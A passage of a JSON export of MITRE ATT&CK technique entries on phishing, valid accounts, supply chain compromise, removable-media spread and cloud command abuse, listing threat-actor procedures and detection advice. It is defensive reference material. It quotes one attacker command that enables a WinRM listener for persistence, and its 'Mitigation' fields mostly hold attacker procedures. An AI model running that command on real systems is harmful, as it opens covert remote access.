        "description": "During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}.[36]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN.[37]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.[38][39][40]"
      },
      {
        "id": "G1015",
        "name": "Scattered Spider",
        "description": "Scattered Spider has leveraged legitimate remote management tools to maintain persistent access.[41]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools.[42][43]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments.[44][45] TeamTNT has also targeted exposed kubelets for Kubernetes environments.[4]"
      },
      {
        "id": "G0088",
        "name": "TEMP.Veles",
        "description": "TEMP.Veles has used a VPN to persist in the victim environment.[46]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services.[47] Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.[48]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.[49]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Metadata",
        "detects": "Follow best practices for detecting adversary use of Valid Accounts for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that may use Valid Accounts to access and/or persist within a network using External Remote Services. Use of External Remote Services may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using External Remote Services."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
      }
    ],
    "Subtechniques": "Persistence, InitialAccess"
  },
  {
    "Title": "Hardware Additions",
    "Code": "T1200",
    "Description": "Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.[1][2][3][4]",
    "Mitigation": [
      {
        "id": "G0105",
        "name": "DarkVishnya",
        "description": "DarkVishnya used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company’s local network.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Configuration management databases (CMDB) and other asset management systems may help with the detection of computer systems or network devices that should not exist on a network."
      },
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Creation",
        "detects": "Monitor for newly constructed drives or other related events associated with computer hardware and other accessories (especially new or unknown) being connected to systems. Endpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
      }
    ],
    "Subtechniques": "\nInitial Access"
  },
  {
    "Title": "Phishing",
    "Code": "T1566",
    "Description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules).[1][2] Another way to accomplish this is by forging or spoofing[3] the identity of the sender which can be used to fool both the human recipient as well as automated security tools.[4] Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,[5][6] or install adversary-accessible remote management tools onto their computer (i.e., User Execution).[7]",
    "Mitigation": [
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used spear phishing to initially compromise victims.[8][9]"
      },
      {
        "id": "G0115",
        "name": "GOLD SOUTHFIELD",
        "description": "GOLD SOUTHFIELD has conducted malicious spam (malspam) campaigns to gain access to victim's machines.[10]"
      },
      {
        "id": "S0009",
        "name": "Hikit",
        "description": "Hikit has been spread through spear phishing.[9]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal has been spread through the use of phishing campaigns including \"call back phishing\" where victims are lured into calling a number provided through email.[11][12][13]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may send phishing messages to gain access to victim systems. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[14][15] URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.Monitor call logs from corporate devices to identify patterns of potential voice phishing, such as calls to/from known malicious phone numbers. Correlate these records with system events."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files from a phishing messages to gain access to victim systems."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze SSL/TLS traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)). Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[14][15]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1566.001",
        "name": "Spearphishing Attachment"
      },
      {
        "id": "T1566.002",
        "name": "Spearphishing Link"
      },
      {
        "id": "T1566.003",
        "name": "Spearphishing via Service"
      },
      {
        "id": "T1566.004",
        "name": "Spearphishing Voice"
      }
    ],
    "Tactic": "\nInitial Access"
  },
  {
    "Title": "Replication Through Removable Media",
    "Code": "T1091",
    "Description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.[1] This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.[2][3] For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
    "Mitigation": [
      {
        "id": "S0092",
        "name": "Agent.btz",
        "description": "Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.[4]"
      },
      {
        "id": "S1074",
        "name": "ANDROMEDA",
        "description": "ANDROMEDA has been spread via infected USB keys.[5]"
      },
      {
        "id": "G1007",
        "name": "Aoqin Dragon",
        "description": "Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.[6]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[7]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.[8][7][9]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker variants used the Windows AUTORUN feature to spread through USB propagation.[10][11]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can spread across systems by infecting removable media.[12]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.[13]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky searches for removable media and duplicates itself onto it.[14]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations.[15]"
      },
      {
        "id": "S0143",
        "name": "Flame",
        "description": "Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.[16]"
      },
      {
        "id": "S0132",
        "name": "H1N1",
        "description": "H1N1 has functionality to copy itself to removable media.[17]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has used malicious DLLs to spread malware to connected removable USB drives on infected machines.[18][19]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has used a customized PlugX variant which could spread through USB connections.[20]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can be configured to spread via removable drives.[21][22]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has the ability to use removable drives to spread through compromised networks.[23]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can spread itself by infecting other portable executable files on removable drives.[24]"
      },
      {
        "id": "S0028",
        "name": "SHIPSHAPE",
        "description": "APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.[25]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.[26]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine.[27]"
      },
      {
        "id": "S0130",
        "name": "Unknown Logger",
        "description": "Unknown Logger is capable of spreading to USB devices.[28]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has copied itself to and infected removable drives for propagation.[29][30]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can copy its installer to attached USB storage devices.[27]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.[31]"
      }
    ],
    "Detection": [
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Creation",
        "detects": "Monitor for newly constructed drive letters or mount points to removable media"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected files accessed on removable media."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files on removable media"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery."
      }
    ],
    "Subtechniques": "LateralMovement, InitialAccess"
  },
  {
    "Title": "Supply Chain Compromise",
    "Code": "T1195",
    "Description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:Manipulation of development toolsManipulation of a development environmentManipulation of source code repositories (public or private)Manipulation of source code in open-source dependenciesManipulation of software update/distribution mechanismsCompromised/infected system images (multiple cases of removable media infected at the factory)[1][2] Replacement of legitimate software with modified versionsSales of modified/counterfeit products to legitimate distributorsShipment interdictionWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.[3][4][5] Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[6][3][5] Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.[7]",
    "Mitigation": [
      {
        "id": "M1051",
        "name": "Update Software",
        "description": "A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation."
      },
      {
        "id": "M1016",
        "name": "Vulnerability Scanning",
        "description": "Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well.[8]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity."
      },
      {
        "id": "DS0013",
        "dsource": "Sensor Health",
        "dcomp": "Host Status",
        "detects": "Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes and compare against known good baseline behavior."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1195.001",
        "name": "Compromise Software Dependencies and Development Tools"
      },
      {
        "id": "T1195.002",
        "name": "Compromise Software Supply Chain"
      },
      {
        "id": "T1195.003",
        "name": "Compromise Hardware Supply Chain"
      }
    ],
    "Tactic": "\nInitial Access"
  },
  {
    "Title": "Trusted Relationship",
    "Code": "T1199",
    "Description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.[1]In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.[2]",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.[3]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.[4]"
      },
      {
        "id": "G0115",
        "name": "GOLD SOUTHFIELD",
        "description": "GOLD SOUTHFIELD has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.[5]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations.[6]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.[7][8][9][10][11]"
      },
      {
        "id": "G1005",
        "name": "POLONIUM",
        "description": "POLONIUM has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company.[12]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.[13]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.[14][15]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has compromised third party service providers to gain access to victim's environments.[16]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Configuration management databases (CMDB) and other asset management systems may help with the detection of computer systems or network devices that should not exist on a network. Monitor logs for unexpected actions taken by any delegated administrator accounts.[17]"
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior that may breach or otherwise leverage organizations who have access to intended victims."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Logon Session Metadata",
        "detects": "Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure) from a trusted entity. Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      }
    ],
    "Subtechniques": "\nInitial Access"
  },
  {
    "Title": "Valid Accounts",
    "Code": "T1078",
    "Description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1] Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. [4]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 actors leverage legitimate credentials to log into external remote services.[5]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[6][7][8][9]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used a compromised account to access an organization's VPN infrastructure.[10]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used valid accounts for initial access and privilege escalation.[11][12]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA).[13]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used compromised credentials to log on to other systems.[14][15]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used previously compromised administrative accounts to escalate privileges.[16]"
      },
      {
        "id": "G0008",
        "name": "Carbanak",
        "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[17]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used a valid account to maintain persistence via scheduled task.[18]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has compromised user credentials and used valid accounts for operations.[19][20][21]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack used hard-coded credentials to gain access to a network share.[22]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[23]"
      },
      {
        "id": "G0051",
        "name": "FIN10",
        "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.[24]"
      },
      {
        "id": "G0085",
        "name": "FIN4",
        "description": "FIN4 has used legitimate credentials to hijack email communications.[25][26]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[27][28][29]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.[30][31][32]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has harvested valid administrative credentials for lateral movement.[33]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used valid accounts for persistence and lateral movement.[34]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used valid credentials with various services during lateral movement.[35]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM leveraged valid accounts to maintain access to a victim network.[36]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer can use supplied user credentials to execute processes and stop services.[37]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.[38]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has used valid SSH credentials to access remote hosts.[39]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.[40][41]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments.[42]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has obtained valid accounts to gain initial access.[43][44]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit acquires valid SSH accounts through brute force. [45]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[46][47][48][49]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[50]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used compromised credentials to access other systems on a victim network.[51][52][15]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access.[53]"
      },
      {
        "id": "G0011",
        "name": "PittyTiger",
        "description": "PittyTiger attempts to obtain legitimate credentials during operations.[54]"
      },
      {
        "id": "G1005",
        "name": "POLONIUM",
        "description": "POLONIUM has used valid compromised credentials to gain access to victim environments.[55]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks.[56]"
      },
      {
        "id": "S0053",
        "name": "SeaDuke",
        "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[57]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used compromised credentials to log on to other systems and escalate privileges.[58]"
      },
      {
        "id": "G0122",
        "name": "Silent Librarian",
        "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.[59]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.[60][61][62]"
      },
      {
        "id": "G0039",
        "name": "Suckfly",
        "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[63]"
      },
      {
        "id": "G0088",
        "name": "TEMP.Veles",
        "description": "TEMP.Veles has used compromised VPN accounts.[64]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[65]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers.[66][67]"
      }
    ],
    "Detection": [
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Logon Session Metadata",
        "detects": "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      },
      {
        "id": "T1078.004",
        "name": "Cloud Accounts"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence, PrivilegeEscalation, InitialAccess"
  },
  {
    "Title": "Cloud Administration Command",
    "Code": "T1651",
    "Description": "Adversaries may abuse cloud management services to execute commands within virtual machines or hybrid-joined devices. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. Similarly, in Azure AD environments, Microsoft Endpoint Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to the Azure AD.[1][2][3]If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines or on-premises hybrid-joined devices. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines.[4]",
    "Mitigation": [
      {
        "id": "S0677",
        "name": "AADInternals",
        "description": "AADInternals can execute commands on Azure virtual machines using the VM agent.[5]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines.[4]"
      },
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can run commands on EC2 instances using AWS Systems Manager Run Command.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor commands and scripts executed on virtual machines. In Azure, usage of Azure RunCommand can be identified via the Azure Activity Logs, and additional details on the result of  executed jobs are available in the C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows directory on Windows virtual machines.[7]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor virtual machines for the creation of processes associated with cloud virtual machine agents. In Windows-based Azure machines, monitor for the WindowsAzureGuestAgent.exe process.[7]"
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor commands and scripts executed on virtual machines. In Azure, usage of Azure RunCommand can be identified via the Azure Activity Logs, and additional details on the result of  executed jobs are available in the C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows directory on Windows virtual machines.[7]"
      }
    ],
    "Subtechniques": "\nExecution"
  },
  {
    "Title": "Command and Scripting Interpreter",
    "Code": "T1059",
